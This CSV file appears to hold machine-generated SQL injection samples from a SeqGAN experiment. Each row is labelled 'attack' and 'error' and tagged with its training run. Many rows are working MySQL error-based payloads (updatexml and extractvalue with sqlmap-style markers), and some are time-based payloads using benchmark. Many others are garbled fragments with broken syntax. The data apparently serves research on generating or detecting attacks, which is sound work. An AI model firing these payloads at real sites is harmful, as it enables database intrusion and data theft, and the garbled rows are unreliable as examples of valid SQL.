attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1014
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1015
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1016
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ''  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1017
attack,")1  )1  updatexml  (  (  1808,concat  (  (  (  (  (  =  (  3393,md5  (  benchmark  (  (  e  =  (  (  2917,1   from dual  )   end  (  (  1724  )  (  (  elt  (  1297  =  (  (  benchmark  (  (  5000000,md5  (  (  0x5c,  (  (  (  select   (  (  elt7982  =  (  (  (  1808  =  (  (  7982  (  (  0x2e,0x7171706a71,  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1018
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1019
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1020
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1021
attack,"1%""   )    )     extractvalue  (  (  9627,concat  (  (  (  (  (  (  (  3393,concat  (  (  (  (  0x4b774c75   (  (  elt  (  0x5c,0x7171706a71,  (  select   (  )  elt  (  case  =  0x7171706a71,  0x4b774c75   (  e  (  e  (  elt  (  elt  (  =  7982  (  0x2e,0x7171706a71  (  =  (  9627,concat  (  (  (  0x5c,  (  select   (  elt  (  1297  =  7151  (  1808,1   )",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1022
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%kbbblonei",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1023
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1024
attack,"1%,' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'h' like 'zq0x5c88607744"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""einl",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1025
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'ckhhf'  =  'kjkpkjfej1151ym      0x780x7171706a715  (  0x2e,0x7171706a71(  =  (  5000000,md5  (  (  0x5c,  (  (  (  select   (  5777  (  elt  (  2917  =  (  7982,concat  (  (  (  (  0x2e,md5  (  benchmark  (  (  (  (  0x5c,0x7171706a71,  (  (  0x4b774c75   (  9490  (  (  elt  (  1808  =  (  (  1808  =  3393,  (  =  (  (  9627,concat  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1026
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1027
attack,"1 or extractvalue  (  (  e(  1808  =  =  (  (  1297,concat  (  (  (  0x5c,  (  benchmark  (  (  5000000,md5  (  (  0x2e6212  =  3393,  (  select   (  case when   (  1 a  (  el  (  (  0x2e,0x7171706a71,  (  5000000(  (  0x2e,0x7171706a71,  (  select   (  case concat  (  elt  (  7982  =  (  3393,1   (  case when   (  1354  (  (  (  0x2e,0x7171706a71,  (  select   (  e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1028
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1029
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1030
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1031
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and """"  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""khu""  =  ""1543",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1032
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1033
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""oknnIgSgkmhmryninz",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1034
attack,"1""   or extractvalue  (  (  (  (   (  (  (  eltal  1297  =  (  (  =  1   )    (  select   (  4568  =  1535  ut  )    select   (  case when   (  9667  (  (  3393  =  4688  (  3393,1  )  select   (  )  case when   (  (  elt  (  1297  =  (  3393,1"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""from d5  (  7982,concat  (  (  0x2e,0x7171706a71,  (  5000000,md5  =  (  3393,  (  select   (  e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1035
attack,"1%"",8666  DUALo%'  =  '%S9667 RSO   )    AND 'i'  =  1 extractvalue  (  (  (  e  (  (  select   (  e  (  elt  (  elt  (  7982  =  (  0x2e,0x7171706a71,  (  t  (  (  select   (  elt  (  5000000(  (  benchmark  (  (  e  (  3393,1   )  )    extractvalue  (  (  (  7982,1   )    )     )  extractvalue  (  (  (  1808,1   )    )Nhol_nanal",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1036
attack,"1%""  =  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1037
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1038
attack," and extractvalue  (  (  (  (  (  9627,concat  (  (  (  )  (  (  =  3393,  (  (  5000000,m(  (  (  select   (  el  (  1808  =  0x2e,md5  (  (  select   (  elt  (  1808  =  (  (  0x2e,0x7171706a71,0x717a767a71  ,  (  (  benchmark,  (  select   (  elt  (  elt  (  e  (  0x2e,0x7171706a71,  (  benchmark  (  (  5000000  (  (  (  0x52515a50   (  (  elt  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1039
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1040
attack,"1,updatexml  (  (  (  3393,concat  (  (  0x2e,0x7171706a71,  (  (  (  select   (  case 0 from d 0 from(  (   (  3863  (  el  )   (  2914  (  (  (  3393  (  (  (  0x2e,0x7171706a71,  (  benchmark  (  (  benchmark  (  (  5000000,md5  (  (  0x5c,0x7171706a71,concat  (  (  (  (  select   (  elt  (  1808  =  (  (  select   (  elt  (  elt  (  1808  )  0x5c,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1041
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1042
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1043
attack,"1%1%      pp"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  ""okpr",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1044
attack,"1%'   (  )   from (    (  e  (  (  (  elt  (  3393  )  (  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  5000000(  0x2e,0x7171706a71,  (  select   (  elt  (  elt  (  e  (  5000000,md(  select   (  e  ual  )  )   end  (  (  case concat  (  elt  (  elt  (  3393  =  (  0x2e,0x7171706a71,  (  8860  =  (  6581  (  (  benchmark  5000000,md5  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1045
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1046
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1047
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1048
attack,"1%"" and updatexml  (  (  (  (  (  (  (  =  (  (  (  (  (  1808,1   (  case 0 from d dua   (  )  (  elt  e  )  e  (  0x5c(  0x2e,md5  (  (  0x2e,0x7171706a71,  (  benchmark  (  (  5000000(  (    (  5000000(  (  0x2e,0x7171706a71,  (  benchmark  (  (  select   (  e  (  elt  (  9788  =  (  (  select   (  elt  (  elt  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1049
attack,"1%""   )    uUSERS8318   )    AND 'i'"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""  ~  =  2162  )  (  select   (   from dual  )  )  6212  =  9490,1   )    (  extractvalue  (  (  9627,concat  (  (  (  0x2e,0x7171706a71,  (  benchmark  (  7982,md5  (  (  3393  (  (  (  0x5c,  (  select   (  1812  =  (  1808,1   from dual  )  )   end  4415  (  (  2917=  (  7982,1   )    (  extractvalue  (  1297,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1050
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1051
attack,"1"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""zm"" like ""e%'  =  ' bvenanalyse    (  1354  (  select   (  elt  (  1297  =  (  7982,concat  (  (  (  0x5c,  (  select   (  (  elt  (  elt  (  et  (  1808  =  (  1543  (  0x2e,md5  (  0x5c,0x7171706a71,  (  extractvalue  (  (  (  (  benchmark  (  (  (  5000000,md5  (  (  0x5c,0x7171706a71,  (  5000000,md5  (  (  0x5c,0x7171706a71,  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1052
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1053
attack,"1%"" or extractvalue  (  (  (  (  (  (  (  2917,concat  (  (  =  (  (  (  0x5c,0x7171706a71,  (  select   (  3576   AND dua   (  2501  (  elt  (  e  (  0x5c,  (  benchmark  (  5000000(  (  0x2e,0x7171706a71,  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  benchmark  (  benchmark  (  benchmark  (  (  5000000(  (  0x5c,0x7171706a71,  (  5000000(  (  0x2e,  (  (  select   (  e  (   (  4568  9788",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1054
attack,"1%'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1055
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1056
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1057
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1058
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1059
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  "")      )    1161S     )  1  (  extractvalue  (  (  (  9627,concat  (  (  0x2e,0x7171706a71  (  (  5000000(  (  7982  =  (  (  (  0x5c,md5  (  0x2e,0x7171706a71,  (  (  benchmark  (  benchmark  (  5000000(  (  (  3393,concat  (  (  (  0x2e,md5  (  (  0x5c,0x7171706a71,1   (  5740  (  (  5000000,md5  (  0x5c,  (  amd5  (  (  4125  )  3393  (  (  0x2e,0x7171706a71,  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1060
attack,"1%'   )    )    (  (  select   ( 0 or extractvalue  (  (  (  3393,concat  (  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  elt1812    =  (  0x5c,  (  (  5000000,md5  (  (  0x4b774c75   (  5847  (  5000000(  select   (  elt  (  elt  (  5000000,md5  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  (  3393,1   from dual  )  )   (  3863  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1061
attack,"1%'   )    )    AND 5198  (  select   (  5464  =  (  (  3393,1   from d5  )  elt  (  (  e  )  0x2e,md5  (  0x2e,0x7171706a71,  (  =  9627,md5  (  select   (  elt  (  e(  0x52515a50   (  6804  (  7982  =  (  0x2e,0x7171706a71,  (  5000000(  (  0x2e  =  (  (  9255,1   or extractvalue  (  (  3576  =  (  3393,m,  (  (  2917,concat  (  (  (  7706  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1062
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1063
attack,"1' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and 'z5000000(  (  extractvalue  (  (  (  (  (  9627,concat  (  (  (  (  (  (  0x2e,mxymd5  (  updatexml  (  (  (  (  0x5c,  (  (  (  select   (  elt  (  elt  (  (  (  1808  =  2446  (  3393,1   )    ual_Sw",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1064
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1065
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1066
attack,"1%' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and 'end"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""e'(  (  ell  (  0x4b774c75   (  (  0x5c,0x7171706a71,  (  (  select   (  elt  (  elt  (  1808  =  1297,1   )    (  extractvalue  (  (  3393,concat  (  extractvalue  (  (  (  5000000(  10496200  )   end  (  (  3393,1   )    )     )  extractvalue  (  9255,m  (  extractvalue  (  (  (  9627,concat  (  (  (  0x2e,0x7171706a71,  (  select   (  case when   (  (  3393,  (  1297,1   ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1067
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1068
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1069
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  ""'  =  'k",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1070
attack,"select   (  )  case when   (  (  5704  (  7982  =  (  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  1297  =  (  3393,1   from dua  elt  (  case when   from dduan dua  elt  )  elte  e  (  0x5c,0x7171706a71,  (  select   (  elt  (  1808  =  (  (  0x2e,0x7171706a71,  (  benchmark  (  (  5000000,md5  (  (  0x5c,0x7171706a71,  (  (  select   (  u",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1071
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%y"" like """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1072
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1073
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1074
attack,"1%""   #%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1075
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1076
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1077
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1078
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1079
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1080
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1081
attack,"1%'   )    )    AND 9338  =  1 extractvalue  (  (  (  3393(  =  (  3393,md5  (  (  (  (  (  0x2e,0x7171706a71,  benchmark  (  select   (  elt  elt  (  0x2e,0x7171706a71,  (  (  select   (  1272   (  )  (  (  elt  (  e  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  5000000(  0x5c,  (  0x5c,md5  (  select   (  elt  (  e  (  1297  =  (  1808,1   )    ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1082
attack,"1"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""ymwmwmb""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1083
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1084
attack,"1%,or' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '6"" like ""icknn/  (  (  (  0x2e,0x7171706a71,  (  (  (    (  =  (  (  9627,concatt  (  (  (  0x5c,0x7171706a71,  (  t  (  (  benchmark  (  (  5000000(  (  (  59894660  =  (  2917,concat  (  (  select   (   (  (  5433  =  5433  )  (  (  (  0x2e,0x7171706a71,  (  =  U  (  (1 a  )  1 as   (  (  elt   (  6804  (  (  0x2e,md5",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1085
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""% ANDipckpkphf'  =  'kdnn m(  (  9103  (  (  0x2e,md5  (  (  0x5c,0x7171706a71,0x7171706a71,  (  select   (  elt  (  case when   (  1724  (  benchmark  (  (  5000000(  (  (  0x2e,  (  benchmark  (  (  5000000,m(  (  (  (  2917,concat  (  (  (  (  (  0x5c,0x7171706a71,  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  elt  (  7982  =  (  0x2e,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1086
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  ''  =  'kbcogh' like 'kudh",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1087
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  'kbnroneeduana  )  )0 d5  (  elt  elt  (  (  0x5c,0x717a767a71   (  4774  (  (  1297,concat  (  (  0x2e,0x7171706a71,  (  (  (  5000000,md5  (  (  5000000,m(  (  (  select   (  elt  (  1297  =  (  (  select   (  elt  (  9350  1759  (  select   (  elt  (  elt  (  case=  3335  (  (  5000000,md5  (  0x2e,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1088
